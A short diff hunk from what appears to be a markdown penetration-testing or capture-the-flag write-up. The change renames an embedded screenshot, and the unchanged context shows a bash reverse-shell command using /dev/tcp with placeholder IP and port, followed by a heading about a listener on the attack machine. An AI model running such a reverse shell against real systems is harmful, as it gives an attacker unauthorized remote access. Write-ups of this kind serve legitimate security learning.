@@ -131,7 +131,7 @@ The `id` command can be replaced with a reverse shell for interactive access:
 "bash", "-c", "bash -i >& /dev/tcp/*ip*/*port* 0>&1"
 ```
 
-![[Pasted image 20260919231713.png]]
+![[revshellcode.png]]
 
 **Setup listener on attack machine:**
 
